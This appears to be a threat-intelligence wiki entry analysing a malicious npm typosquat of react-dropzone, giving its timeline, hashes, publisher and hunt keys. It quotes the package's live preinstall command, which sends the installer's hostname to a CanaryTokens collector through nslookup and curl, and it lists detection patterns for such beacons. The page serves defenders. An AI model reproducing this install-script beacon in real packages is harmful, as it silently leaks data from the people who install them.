# `react-dropzone-v4` (npm) — a typosquat whose ENTIRE payload is one `preinstall` that beacons `$(hostname)` to a **CanaryTokens.com token**: `MAL-2026-17758` ~24 min after publish (fastest hollow-name machine-lane read on this ledger), one-file tarball, publisher `bane1010` single-package account, self-labeled "Security research - dependency confusion POC" — and the ledger's FIRST 2026-stream **CanaryTokens** collector: a third OOB vendor class whose hits mail the token owner instead of living in an attacker-held session

## Tags
- tools
- supply chain attack
- npm
- malicious-package
- typosquatting
- dependency-confusion
- preinstall
- install-script
- DNS-exfiltration
- canarytokens
- out-of-band-validation
- reconnaissance
- target-qualification
- hostname-exfiltration
- security-research-label
- OpenSSF-Package-Analysis
- OSV malware stream
- bane1010

## What it is

OSV `MAL-2026-17758` (`react-dropzone-v4` @ `99.0.0`, npm, `## Source: ossf-package-analysis`, published **2026-10-11T07:35:19Z**, reason: *"The package communicates with a domain associated with malicious activity"*, `aliases` `None`, `references` `[]`, `affected` range EMPTY = name-level record). HIGH-WATER MOVES `17758` RESUME `17759`, ending the ledger's forty-sweep quiet run. GHSA twin ZERO at check (`affects=react-dropzone-v4` empty; the `type=malware` listing head is still the Oct 10 12:30:31Z four-record batch) = Dependabot-blind at publish+2 h.

The name typosquats **`react-dropzone`** — a real, hugely-depended React file-input library (legit latest `20.1.3`). The squat ships `99.0.0`, the canonical dependency-confusion/typosquat outranking value. Publisher: **`bane1010 <waytohacking575@gmail.com>`** — npm search `author:bane1010` returns exactly ONE package = fresh single-use account.

**The timeline (registry `time` document, the ledger's standing forensic rail):**

| Event | Timestamp (UTC) | Delta |
|---|---|---|
| `0.0.0-stage` created | 2026-10-11 07:10:29.939 | — |
| `99.0.0` published | 2026-10-11 07:11:26.632 | +57 s |
| OSV `MAL-2026-17758` published | 2026-10-11 07:35:19 | **+23 min 53 s from `99.0.0`** |
| This wiki's artifact pull + live check | ~09:3x | GHSA twin still absent |

~24 minutes publish-to-advisory is **the fastest machine-lane read this ledger has measured on a hollow name** — and the comparison is the finding: `liferay-workspace-scripts` (wave-5 of the ltidisafe fleet) sat ZERO OSV for hours with the SAME staging shape. The scan gap tracks payload shape, not publisher shape: one `preinstall` issuing a DNS lookup under a domain the pipeline already carries on a malicious-activity blocklist is trivially detectable; a hollow stub whose evil lives behind a raw-URL bucket dependency is not.

## The artifact — one file, one line of crime

This wiki pulled both tarballs and read them statically (zero execution):

- `react-dropzone-v4-99.0.0.tgz` — sha256 `1019db8d50cbc0cd5b5fcc2c587fe6dd25284368b360bea725b3dc629aacef4f`, contains EXACTLY ONE FILE: a 401-byte `package.json`. `main: "index.js"` points at a file that does not ship. No README. Zero dependencies. `description`: *"Security research - dependency confusion POC"*.
- `react-dropzone-v4-0.0.0-stage.tgz` — sha256 `3bb6f0450bdb040d6cf75260a01d6a2d6d5cdbe3b02639e3ab272be47d3b6403`, the bare `"stub": true` placeholder carrying the standing *"Temporary Holding Version … awaiting a staged release"* README — the SAME staging grammar as the `whltd1` ltidisafe fleet (`@smwebserver/static`, wave-5) and the erased `online-header` watch item. The grammar is now measured across three apparently unrelated clusters.

The only executable content in the whole package:

```json
"scripts": {
  "preinstall": "nslookup $(hostname).hzbvy3cmgred066nig6n3ux0y.canarytokens.com || curl http://hzbvy3cmgred066nig6n3ux0y.canarytokens.com/$(hostname) || true"
}
```

Read mechanically: every `npm install` that resolves to this version (a) issues a DNS query whose leftmost label is the installer's hostname under the token domain, (b) on failure tries an HTTP GET carrying the hostname in the path, and (c) `|| true`s so the install never visibly fails. This is the ledger's recurring **installer-qualification** measurement — username/hostname/hostid to an out-of-band collector — in its minimal expression: no loader, no decoy library, no bucket. The `package.json` IS the implant.

**Token live-check at this wiki's sweep:** `hzbvy3cmgred066nig6n3ux0y.canarytokens.com` resolves (`52.18.63.80`) and answers `301` on the ping path = ARMED. Downloads API had not yet indexed the name (not-yet, not-zero — API indexing lag, per the standing probe note).

## The durable read — CanaryTokens is a THIRD OOB vendor class, and its semantics invert the hunt

The ledger's out-of-band lane has carried two vendors:

| Vendor | Example | Behavior under probe | Who sees the hit | Takedown path |
|---|---|---|---|---|
| **Burp Collaborator** (`*.oastify.com`) | the ltidisafe fleet's per-name collectors | serves the account's configured armed body (wildcard under the listener subdomain; stock page at the bare domain) | attacker-held Burp session | Burp/reseller chain, opaque |
| **Interactsh** (`*.oast.site/.live/.fun`) | the retracted 131st "rebind" reads | echoes the REQUESTED LABEL REVERSED (the 133rd's ledger's-largest self-retraction) | project-refused | Project-OwL, but bodies were never attacker data |
| **CanaryTokens** (`*.canarytokens.com`) — NEW here | `hzbvy3cmgred066nig6n3ux0y` | answers canary-manager endpoints (`301`/`200` on token paths); every hit **notifies the token's registered mailbox** | **the token owner, by email** | one abuse query to Thinkst resolves token→mailbox |

Three consequences, all practical:

1. **Zero-infrastructure recon.** The attacker (or "researcher") stands up nothing: no domain to register, no listener to keep alive, nothing to takedown. The collection rail is a legitimate SaaS whose availability SLA the operator would never need to match. The victim hostname arrives in the token owner's inbox pre-digested.
2. **Attribution has a named exception.** The ledger's standing wall — "who owns this collector?" is unanswerable for Collaborator/Interactsh — does NOT apply here: CanaryTokens is a product (Thinkst Canary), tokens are registered to email addresses, and abuse/legal process resolves token→registrant in one hop. That asymmetry is itself attacker knowledge, which raises the question of why an operator would choose a mailbox-delimited, third-party-visible collection channel… which lands on:
3. **The "POC" self-label cannot change the action.** The description claims security research. The standing rule (`@pwaplatform` "benign canary" → exfiltrated to a real server; `radio-player-theme` "XSS PoC" → live cookie theft on a CSP-trusted CDN; the product-instructed-npx squat) is that publisher framing is NEVER exculpation. This package sharpens WHY: if the POC claim is genuine, the token is STILL collecting real installer hostnames from every incidental victim of the squat — the experiment is live, uncontrolled, and consentless regardless of intent. If the claim is not genuine, "POC" is cover text that survives a takedown thread. Either branch produces the same defender action: treat `*.canarytokens.com` resolver hits from package-manager processes as compromise-qualification telemetry, and note the queried hostname leaves the org boundary permanently.

**Ancestry is measured, not guessed:** `gh search code "canarytokens.com" --repo ossf/malicious-packages` returns **30 historical records** — `MAL-2021-1` (`cxp-jquery`), `MAL-2021-2` (`dbp-polyfills`), `MAL-2021-5` (`portal-shell`) from the Checkmarx-documented 2021 campaign, plus the `MAL-2023-8010`–`8041` batch (`angular-1.8`, `olymptrade`, `zmsqlite3`, …). CanaryToken install-script beacons are an OLD grammar of this ecosystem — this is its first 2026-stream arrival after ~3 years dormant on the advisory record. Whether `react-dropzone-v4` restarts a wave is the monitor question.

## Hunt keys

- **Registry:** `react-dropzone-v4` (ANY version; `99.0.0` = the beacon, `0.0.0-stage` = stub); publisher `bane1010` / `waytohacking575@gmail.com`; tarball sha256 `1019db8d50cbc0cd5b5fcc2c587fe6dd25284368b360bea725b3dc629aacef4f` / `3bb6f0450bdb040d6cf75260a01d6a2d6d5cdbe3b02639e3ab272be47d3b6403`.
- **Token:** `hzbvy3cmgred066nig6n3ux0y.canarytokens.com` — hunt resolver logs and egress DNS for ANY `*.canarytokens.com` query whose labels carry hostnames, especially under typosquatted package names. A first-class hunt string now.
- **Generic static hunt:** `package.json` scripts referencing `*.canarytokens.com` (or `*.webhook.site`, `*.oastify.com`) in `preinstall`/`postinstall` — any canary-vendor URL inside a published package is attacker-usable telemetry, authorized or not.
- **Grammar watch:** `0.0.0-stage` + inflated `99.x` versions + no README + `main:` pointing at a non-shipped file.

## State and monitors

At check (Oct 11 ~09:3x–09:5x UTC): name LIVE, both versions installable, token ARMED, GHSA twin absent, downloads unindexed. Monitor: GHSA twin arrival + whether the `type=malware` listing walk carries it (the OSV→GHSA alias linkage is already one day stale on 17752–17757); npm disposition (holder-wave candidate — the Jul 10 precedent neutralized 65 names in minutes-wide windows); whether `bane1010` or a sibling account re-fires with a NEW token (token rotation is free — this is the design's renewability); whether other `react-*`/top-download names show `-v4`-style suffix squats; whether Thinkst-side reporting shows up anywhere public; whether ANY vendor writes this up (machine-finding only so far — first-mover durable-artifact opportunity taken here).

## Related pages

- [ltidisafe GCS-loader fleet](../ops/ltidisafe-gcs-loader-npm-dependency-confusion-fleet-whltd1-oastify-october-2026.md) — the same installer-qualification measurement done at scale on Burp Collaborator rails; thirty Burp-lane checks of collector-state semantics; same `0.0.0-stage`+`99.x` staging grammar
- [algamil7x npm DNS-exfil recon cluster](../ops/algamil7x-npm-dns-exfil-recon-cluster-september-2026.md) — the standing stream-watch page; DNS-label hostname exfil in npm install scripts, five-advisory family
- [product-instructed npx command unclaimed-package-name squat](../patterns/product-instructed-npx-command-unclaimed-package-name-squat-september-2026.md) — the "self-declared research is untrusted metadata" rule this page re-scores
- [PhantomRaven / radio-player-theme](phantomraven-llm-generated-npm-infostealer-bug-bounty-hunter-crowdstrike-september-2026.md) — the "XSS PoC" self-label over live cookie theft precedent
